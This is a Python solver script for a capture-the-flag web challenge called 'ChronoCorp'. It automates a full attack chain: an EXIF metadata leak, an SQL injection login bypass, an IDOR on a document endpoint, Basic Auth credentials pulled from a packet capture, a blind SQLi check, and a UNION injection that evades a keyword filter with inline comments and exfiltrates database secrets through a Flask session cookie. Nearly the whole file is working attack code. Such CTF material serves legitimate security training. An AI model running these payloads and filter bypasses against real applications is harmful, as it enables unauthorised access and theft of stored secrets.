#!/usr/bin/env python3
"""
ChronoCorp CTF Solver
Usage:
    python3 solver.py
    python3 solver.py http://chall.ctf.tccpens.id:30219
    python3 solver.py chall.ctf.tccpens.id:30219

Chain:
    1. EXIF leak in /media/employee-spotlight-09.jpg
       -> /staging/login + username dewi.anggraini
    2. SQLi login bypass:  dewi.anggraini' OR '1'='1
    3. IDOR: GET /staging/api/documents/6
       -> Incident Report + incident_report_2026.pcap
    4. PCAP: GET /staging/download/incident_report_2026.pcap
       -> Basic Auth sysadmin:N3tc4p_R3c0v3red_2026!
    5. Admin: /staging/admin (Basic Auth) -> blind SQLi checker
    6. Fast extraction (same SQLite DB, bypass blind extraction):
       Login UNION/**/SELECT with unclosed /* comment,
       exfiltrated value lands in Flask cc_session cookie.
       -> vault.secret_value (root_flag)
"""

import base64
import json
import re
import sys
import zlib

import requests

DEFAULT_BASE = "http://chall.ctf.tccpens.id:30219"


def normalize_base(arg: str) -> str:
    arg = arg.strip().rstrip("/")
    if not arg.startswith(("http://", "https://")):
        arg = "http://" + arg
    return arg


def decode_session_cookie(set_cookie: str) -> dict:
    """Decode Flask/itsdangerous cc_session cookie (handles zlib compression)."""
    val = set_cookie.split("cc_session=")[1].split(";")[0]
    # format: payload.timestamp.signature ; payload may start with '.' if compressed
    payload = val.rsplit(".", 2)[0]
    compressed = False
    if payload.startswith("."):
        compressed = True
        payload = payload[1:]
    payload += "=" * (-len(payload) % 4)
    raw = base64.urlsafe_b64decode(payload)
    if compressed:
        raw = zlib.decompress(raw)
    return json.loads(raw.decode())


class Solver:
    def __init__(self, base: str):
        self.base = base
        self.s = requests.Session()

    # --- UNION-based exfiltration via login (fast path) ---
    def exfil(self, expr: str) -> str | None:
        """
        expr = SQL expression, e.g. "SELECT secret_value FROM vault LIMIT 1"
        Returned row's 2nd column becomes session['username'].
        Users-query columns are (id, username, role, password) -> 4 cols.
        Filter blocks "UNION SELECT", "--", "#" -> bypass with UNION/**/SELECT and /*
        """
        payload = f"' UNION/**/SELECT 999,({expr}),'employee','x' /*"
        r = requests.post(
            f"{self.base}/staging/login",
            data={"username": payload, "password": "x"},
            allow_redirects=False,
            timeout=10,
        )
        cookie = r.headers.get("Set-Cookie", "")
        if r.status_code != 302 or "cc_session=" not in cookie:
            return None
        return decode_session_cookie(cookie).get("username")

    def solve(self) -> str:
        B = self.base
        print(f"[*] Target: {B}")

        # 1. EXIF leak
        r = self.s.get(f"{B}/media/employee-spotlight-09.jpg", timeout=10)
        r.raise_for_status()
        m = re.search(rb"Internal staging note:[^\x00]+", r.content)
        note = m.group().decode() if m else "(EXIF note not found, continuing with known values)"
        print(f"[1] EXIF: {note}")

        # 2. SQLi login bypass as dewi.anggraini
        r = self.s.post(
            f"{B}/staging/login",
            data={"username": "dewi.anggraini' OR '1'='1", "password": "x"},
            allow_redirects=False,
            timeout=10,
        )
        assert r.status_code == 302, f"SQLi login failed: {r.status_code}"
        print("[2] SQLi login OK -> dewi.anggraini")

        # 3. IDOR: document 6 (not listed in dewi's dashboard, which only shows 5)
        r = self.s.get(f"{B}/staging/api/documents/6", timeout=10)
        r.raise_for_status()
        doc = r.json()
        attachment = doc["attachment"]
        print(f"[3] IDOR doc 6: {doc['title']} | attachment={attachment}")

        # 4. Download PCAP, extract Basic Auth creds
        r = self.s.get(f"{B}/staging/download/{attachment}", timeout=10)
        r.raise_for_status()
        m = re.search(rb"Authorization: Basic ([A-Za-z0-9+/=]+)", r.content)
        assert m, "Basic Auth not found in PCAP"
        cred = base64.b64decode(m.group(1)).decode()
        admin_user, admin_pass = cred.split(":", 1)
        print(f"[4] PCAP creds: {cred}")

        # 5. Admin console + blind-SQLi checker sanity check
        r = requests.get(f"{B}/staging/admin", auth=(admin_user, admin_pass), timeout=10)
        assert r.status_code == 200, f"Admin login failed: {r.status_code}"
        r = requests.get(
            f"{B}/staging/admin/api/check_document",
            params={"title": "x' OR EXISTS(SELECT 1 FROM vault) --"},
            auth=(admin_user, admin_pass),
            timeout=10,
        )
        print(f"[5] Admin OK | blind check 'vault exists': {r.text.strip()}")
        assert r.json().get("exists") is True, "vault table not confirmed via blind SQLi"

        # 6. Fast extraction of vault via UNION exfil (skips hundreds of blind requests)
        tables = self.exfil(
            "SELECT group_concat(name,'|') FROM sqlite_master WHERE type='table'"
        )
        print(f"[6] Tables: {tables}")

        vault = self.exfil(
            "SELECT group_concat(label||'='||secret_value,'|') FROM vault"
        )
        print(f"[6] Vault dump: {vault}")
        assert vault, "Failed to extract vault"

        m = re.search(r"[A-Za-z0-9_]+\{[^}]+\}", vault)
        assert m, f"Flag pattern not found in vault: {vault}"
        flag = m.group()
        print(f"\n[+] FLAG: {flag}")
        return flag


if __name__ == "__main__":
    base = normalize_base(sys.argv[1]) if len(sys.argv) > 1 else DEFAULT_BASE
    Solver(base).solve()
